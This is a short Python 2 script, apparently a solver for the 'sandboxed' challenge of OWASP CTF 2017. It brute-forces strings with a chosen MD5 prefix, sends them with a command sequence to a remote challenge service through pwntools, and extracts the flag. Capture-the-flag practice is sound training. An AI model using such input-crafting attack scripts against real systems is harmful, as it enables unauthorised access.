#!/usr/bin/python

#OWASPCTF 2017 
#sandboxed exploit Code 


import itertools,string,hashlib
import time,sys
from pwn import *



letters = string.uppercase
magic = ""

b_f = itertools.combinations_with_replacement(letters, 2)

for i in b_f:
	tryy = "".join(i)
	ha_sh = hashlib.md5(tryy).hexdigest()
	if ha_sh[:2] == "de":
		magic += tryy


con = remote(sys.argv[1],int(sys.argv[2]))

con.send("e flag1\np")
time.sleep(0.5)
con.send(magic+"\n")

DATArecv = con.recv(1024)

index = DATArecv.find("buff")
FLAG = DATArecv[:index]

print "\n[Done!] FLAG is : %s\n"% FLAG